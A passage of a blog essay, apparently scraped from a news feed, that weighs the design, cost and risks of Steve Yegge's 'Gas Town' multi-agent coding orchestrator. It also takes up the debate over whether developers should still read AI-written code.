    &lt;p&gt;I think there’s a lot of opportunity to diversify the cast of characters here and make more use of specialist subagents . The agents in Gas Town are all generalist workers in the software development pipeline. But we could add in any kind of specialist we want: a dev ops expert, a product manager, a front-end debugger, an accessibility checker, a documentation writer. These would be called in on-demand to apply their special skills and tools.&lt;/p&gt;
    &lt;head rend="h3"&gt;Agent roles and tasks persist, sessions are ephemeral&lt;/head&gt;
    &lt;p&gt;One of the major limitations of current coding agents is running out of context. Before you even hit the limits of a context window, context rot degrades the output enough that it’s not worth keeping. We constantly have to compact or start fresh sessions.&lt;/p&gt;
    &lt;p&gt;Gas Town’s solution to this is make each agent session disposable by design. It stores the important information – agent identities and tasks – in Git, then liberally kills off sessions and spins up fresh ones when needed. New sessions are told their identity and currently assigned work, and continue on where the last one left off. Gas Town also lets new sessions ask their predecessors what happened through “seancing”: resuming the last session as a separate instance in order to let the new agent ask questions about unfinished work.&lt;/p&gt;
    &lt;p&gt;This saving and recalling is all done through Gas Town’s “Beads” system. Beads is also the name of the memory management system Yegge built before Gas Town; a precursor to this more ambitious civilisation. Beads are tiny, trackable units of work – like issues in an issue tracker – stored as JSON in Git alongside your code. Each bead has an ID, description, status, and assignee. Agent identities are also stored as beads, giving each worker a persistent address that survives session crashes.&lt;/p&gt;
    &lt;p&gt;Yegge didn’t invent this pattern of tracking atomic tasks outside agent memory in something structured like JSON. Anthropic described the same approach in their research on effective harnesses for long-running agents , just published in November 2025. I give it a hot minute before this type of task tracking lands in Claude Code.&lt;/p&gt;
    &lt;head rend="h3"&gt;Feeding agents continuous streams of work&lt;/head&gt;
    &lt;p&gt;The whole promise of an orchestration system like Gas Town is it’s a perpetual motion machine. You give high-level orders to the mayor, and then a zoo of agents kicks off to break it down into tasks, assign them, execute them, check for bugs, fix the bugs, review the code, and merge it in.&lt;/p&gt;
    &lt;p&gt;Each worker agent in Gas Town has its own queue of assigned work and a “hook” pointing to the current thing they should be doing. The minute they finish a task, the next one jumps to the front of the queue. The mayor is the one filling up these queues – it’s in charge of breaking down large features into atomic tasks and assigning them to available workers. In theory, the workers are never idle or lacking tasks, so long as you keep feeding the mayor your grand plans.&lt;/p&gt;
    &lt;p&gt;This principle of “workers always do their work” is better in theory than practice. It turns out to be slightly difficult to make happen because of the way current models are trained. They’re designed as helpful assistants who wait politely for human instructions. They’re not used to checking a task queue and independently getting on with things.&lt;/p&gt;
    &lt;p&gt;Gas Town’s patchwork solution to this is aggressive prompting and constant nudging. Supervisor agents spend their time poking workers to see if anyone’s stalled out or run dry on work. When one goes quiet, they send it a ping which jolts the agent into checking its queue and getting back to work. These periodic nudges move through the agent hierarchy like a heartbeat keeping everything moving. This is a decent band-aid for the first version, but more serious efforts at agent orchestration systems will need reliable ways to keep agents on task.&lt;/p&gt;
    &lt;head rend="h3"&gt;Merge queues and agent-managed conflicts&lt;/head&gt;
    &lt;p&gt;When you have a bunch of agents all working in parallel, you’re of course going to run into merge conflicts. Each agent is off on its own branch, and by the time it finishes its task, the main branch might look completely different – other changes have landed, the code has moved on. The later an agent finishes, the worse this gets. Normally you, the human, takes on the burden of sorting out the mess and deciding which changes to keep. But if agents are running on their own, something has to do that job for them.&lt;/p&gt;
    &lt;p&gt;So Gas Town has a dedicated merge agent – the Refinery – that works through the merge queue one change at a time. It looks at each merge request, resolves any conflicts, and gets it into main. When things get really tangled – when so much has changed that the original work doesn’t even make sense anymore – it can creatively “re-imagine” the changes: re-doing the work to fit the new codebase. Or escalate to a human if needed.&lt;/p&gt;
    &lt;p&gt;But there’s another way to sidestep merge conflict nightmares that Gas Town doesn’t have built in: ditch PRs for stacked diffs . The traditional git workflow puts each feature on its own branch for days or weeks, accumulating commits, then getting merged back as one chunky PR.&lt;/p&gt;
    &lt;p&gt;Stacked diffs avoid this conflict-prone approach by breaking work into small, atomic changes that each get reviewed and merged on their own, building on top of each other. Every change gets its own branch, forked off the previous change, forming a “stack” of changes dependent on one another. When a change earlier in the stack gets updated, all the changes below it automatically rebase on top of the new version.&lt;/p&gt;
    &lt;p&gt;This fits how agents naturally work. They’re already producing tiny, focused changes rather than sprawling multi-day branches. When conflicts do pop up, they’re easier to untangle because each diff touches less code. Cursor ’s recent acquisition of Graphite , a tool built specifically for stacked diff workflows, suggests I am not the only one who sees this opportunity. When you’ve got dozens of agents landing changes continuously, you need tools and interfaces specifically designed for these frequent, incremental merges.&lt;/p&gt;
    &lt;head rend="h2"&gt;3. The price is extremely high, but so is the (potential) value&lt;/head&gt;
    &lt;p&gt;Yegge describes Gas Town as “expensive as hell… you won’t like Gas Town if you ever have to think, even for a moment, about where money comes from.” He’s on his second Claude account to get around Anthropic’s spending limits.&lt;/p&gt;
    &lt;p&gt;I can’t find any mention online of the per-account limits, but let’s conservatively assume he’s spending at least $2,000 USD per month, and liberally $5,000. Now covered by the $75,000 he’s earned in transaction fees from the $GAS cryptocoin, which gives him a good year to run this at scale&lt;/p&gt;
    &lt;p&gt;The current cost is almost certainly artificially inflated by system inefficiency. Work gets lost, bugs get fixed numerous times, designs go missing and need redoing. As models improve and orchestration patterns mature, the cost of orchestrators like this should drop while output quality rises.&lt;/p&gt;
    &lt;p&gt;I expect companies would happily pay around the $1-3k/month mark for a sane, understandable, higher quality, and lower waste version of Gas Town. Maybe that sounds absurd to you, given we’ve all become anchored to the artificially low rate of $100-200/month for unlimited usage by the major providers. But once the AI bubble pops, the VC funds dry up, and providers have to charge the true cost of inference at scale, we should expect that “unlimited” tier to look a lot pricier.&lt;/p&gt;
    &lt;p&gt;Even when that comes to pass, a few thousand is pretty reasonable when you compare it to an average US senior developer salary: $120,000 USD. Salary average from Indeed . Many people will pick bones over this because the market range is so broad. FAANG engineers in San Fransisco are paid closer to half a million, while developers in Europe are used to salaries in the $30-50k range. This seems like a sensible middle ground. If Gas Town could genuinely speed up the work of a senior developer by 2-3x or more, it would easily be worth 10-30% of their salary. The cost per unit of valuable work starts to look competitive with human labor.&lt;/p&gt;
    &lt;p&gt;The maths on paying for something like this is already defensible in wealthier places like the US and parts of Western Europe. In spots where developer salaries are lower, we would expect the budget for AI assisted tools adjusts accordingly. They’ll get less crazy scaled automation and more conversative useage with humans filling in the cognitive gaps.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Yegge never looks at code. When should we stop looking too?&lt;/head&gt;
    &lt;p&gt;Yegge is leaning into the true definition of vibecoding with this project: “It is 100% vibecoded. I’ve never seen the code, and I never care to.” Not looking at code at all is a very bold proposition, today, in January 2026.&lt;/p&gt;
    &lt;p&gt;Given the current state of models and the meagre safeguards we have in place around them, the vast majority of us would consider this blind coding approach irresponsible and daft to do on anything that isn’t a throwaway side project. Which, given the amount of effort and Claude tokens Yegge has sunk into building it, writing documentation, and publicly promoting it, Gas Town is not.&lt;/p&gt;
    &lt;p&gt;“Should developers still look at code?” will become one of the most divisive and heated debates over the coming years. You might be offended by the question, and find it absurd anyone is asking. But it’s a sincere question and the answer will change faster than you think.&lt;/p&gt;
    &lt;p&gt;I’m already seeing people divide along moralistic, personal identity lines as they try to answer it. Some declare themselves purist, AI skeptic, Real Developers who check every diff and hand-adjust specific lines, sneering at anyone reckless enough to let agents run free. While others lean into agentic maximalism, directing fleets from on high and pitying the mass of luddites still faffing about with manual edits like it’s 2019. Both camps mistake a contextual judgement for a personality trait and firm moral position.&lt;/p&gt;
    &lt;p&gt;A more conservative, easier to consider, debate is: how close should the code be in agentic software development tools? How easy should it be to access? How often do we expect developers to edit it by hand?&lt;/p&gt;
    &lt;p&gt;Interfaces like Claude Code , Cursor , and Conductor do not put code front and centre in the experience. The agent is your first and primary interface. You might be able to see diffs rolls by or display code files inline, but you can’t touch them. Trying to edit code yourself is a roundabout journey of opening your IDE and navigating to the correct files and lines.&lt;/p&gt;
    &lt;p&gt;This design choice assumes it is easier to ask an agent to make the change for you, than it is to type it out the syntax yourself. They clearly say “we don’t believe users need to touch code.”&lt;/p&gt;
    &lt;p&gt;Framing this debate as an either/or – either you look at code or don’t, either you edit code by hand or you exclusively direct agents, either you’re the anti-AI-purist or the agentic-maxxer – is unhelpful. Because nothing is a strict binary.&lt;/p&gt;
    &lt;p&gt;The right distance isn’t about what kind of person you are or what you believe about AI capabilities in the current moment. How far away you step from the syntax shifts based on what you’re building, who you’re building with, and what happens when things go wrong. The degree of freedom you hand over to agents depends on:&lt;/p&gt;
    &lt;head rend="h3"&gt;Domain and programming language&lt;/head&gt;
    &lt;p&gt;Front-end versus backend makes a huge difference. Language is a poor medium for designing easing curves and describing aesthetic feelings – I always need to touch the CSS, and it’s often faster to just tweak directly than try to explain what I want. Yegge’s CLI tooling is much easier to validate with pass/fail tests than evaluating whether a notification system “feels calm enough”. Model competence also varies wildly by language; prompting React and Tailwind gives you much better results than Rust or Haskell, where the models still regularly choke on borrow checkers and type systems.&lt;/p&gt;
    &lt;head rend="h3"&gt;Access to feedback loops and definitions of succes&lt;/head&gt;
    &lt;p&gt;The more agents can validate their own work, the better the results. If you let agents run tests and see the output, they quickly learn what’s broken and how to fix it. If you let them open browsers, take screenshots, and click around, they can spot their mistakes. Tools like the Ralph Wiggum plugin lean into this – it loops until tests pass or some specific condition is validated. This doesn’t work for less defined, clear cut work though. If you try to make an agent design a visual diagram for you, it’s going to struggle. It doesn’t know your aesthetic preferences and can’t really “see” what it’s making.&lt;/p&gt;
    &lt;head rend="h3"&gt;Risk tolerance for shit going wrong&lt;/head&gt;
    &lt;p&gt;Stakes matter. If an agent breaks some images on your personal blog, you’ll recover. But if you’re running a healthcare system where a bug could miscalculate drug dosages, or a banking app moving actual money around, you can’t just wave an agent at it and hope. Consequences scale up fast. Corporate software has people whose entire job is compliance and regulatory sign-off – they need to see the code, understand it, verify it meets requirements. Those people aren’t going to let you widly run Gas Town over projects without serious guardrails in place.&lt;/p&gt;
    &lt;p&gt;“Gas Town sounds fun if you are accountable to nobody: not for code quality, design coherence or inferencing costs. The rest of us are accountable for at least the first two and even in corporate scenarios where there is a blank check for tokens, that can’t last. So the bottleneck is going to be how fast humans can review code and agree to take responsibility for it.”&lt;/p&gt;
    &lt;head rend="h3"&gt;Greenfield vs. brownfield projects&lt;/head&gt;
    &lt;p&gt;Starting fresh (greenfield), means you can let agents make architectural decisions and establish patterns – if you don’t like them, you can easily throw it out and restart. The cost of mistakes is low. But in an existing codebase (brownfield) with years of accumulated conventions, implicit patterns, and code that exists for reasons nobody remembers anymore, agents need much tighter supervision. They’ll happily introduce a new pattern that contradicts the three other ways this codebase already solves the same problem.&lt;/p&gt;
    &lt;head rend="h3"&gt;Number of collaborators&lt;/head&gt;
    &lt;p&gt;If you’re solo of course you can YOLO. If you’re working with more than a handful of people, you’ll have to agree on coding standards and agent rules. This creates its own overhead: updating the AGENTS.md file, picking MCPs, writing commands and skills and rules and whatever else we invent to constrain these things. The pace of change when you’re all using agents can be overwhelming and you need to figure out a sensible reviewing pipeline to manage it. Team coordination can fall apart when everyone’s agents start moving too fast. You might show up in the morning and discover someone’s agent renamed the database schema while another agent refactored the whole API layer, and neither of which jive with your giant, unmerged feature.&lt;/p&gt;
    &lt;head rend="h3"&gt;Your experience level&lt;/head&gt;
    &lt;p&gt;More senior developers can prompt better, debug better, and setup more stringent preferences earned through decades of seeing what can go wrong in scaled, production environments. They can recognize patterns: “oh, that’s a memory leak” or “that’s going to deadlock under load.” Newer developers don’t have that catalog of failures yet and are much more likely to prompt their own personal house of cards. The tests might pass and everything looks fine until you hit production traffic or someone enters a weird character. It is hard to defend against unknown unknowns.&lt;/p&gt;
    &lt;p&gt;Given all these “it depends” considerations, I’m currently in the code-must-be-close camp for most serious work done by professional developers. But I expect I’ll shift to the code-at-a-distance camp over the next year or two as the harnesses and tools we wrap around these agents mature. If we can ship them with essential safe guards and quality gates, the risks drop. Sure, the models will also improve, but the infrastructure matters far more: validation loops, tests, and specialised subagents who focus on security, debugging, and code quality are what will make code-at-a-distance feasible.&lt;/p&gt;
    &lt;p&gt;We have many, continuous versions of the code distance debate interally at Github Next . One of the projects within the team driving this is Agentic Workflows – autonomous agents run through GitHub Actions in response to events: new PRs, new issues, or specific times of day. Every commit can trigger a security review agent, an accessibility audit, and a documentation updater, all running in parallel alongside traditional CI/CD tests before anything lands in main. The team building it rarely touches code and do most of their work by directing agents from their phones. It’s these kinds of guardrails that makes a hands-off Sim-City-esque orchestrator system feel less terrifying to me.&lt;/p&gt;
    &lt;p&gt;I don’t believe Gas Town itself is “it”. It’s not going to evolve into the thing we all use, day in and day out, in 2027. As I said, it’s a provocative piece of speculative design, not a system many people will use in earnest. In the same way any poorly designed object or system gets abandoned, this manic creation is too poorly thought through to persist. But the problems it’s wrestling with and the patterns it has sketched out will unquestionably show up in the next generation of development tools.&lt;/p&gt;
    &lt;p&gt;As the pace of software development speeds up, we’ll feel the pressure intensify in other parts of the pipeline: thoughtful design, critical thinking, user research, planning and coordination within teams, deciding what to build, and whether it’s been built well. The most valuable tools in this new world won’t be the ones that generate the most code fastest. They’ll be the ones that help us think more clearly, plan more carefully, and keep the quality bar high while everything accelerates around us.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46734302</guid><pubDate>Fri, 23 Jan 2026 16:19:18 +0000</pubDate></item></channel></rss>